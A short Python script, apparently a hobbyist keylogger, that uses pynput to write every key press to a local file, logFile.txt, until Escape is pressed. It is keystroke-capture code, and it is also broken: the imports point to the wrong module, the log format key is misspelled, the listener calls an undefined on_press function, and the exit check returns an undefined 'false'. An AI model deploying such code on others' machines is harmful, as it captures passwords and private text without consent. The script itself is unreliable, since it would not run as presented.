#imported from required library pynput
from pynput import Key, Listener
import logging

logFile = ""
logging.basicConfig(filename = (logFile + "logFile.txt"), level = logging.DEBUG, format = '%(asctime)s: %(messages)s:')

def keyStroke(key):
    logging.info(str(key))

    #condition for key logger to end
    if key == Key.esc:
        return false

with Listener(on_press=on_press) as listener:
    listener.join()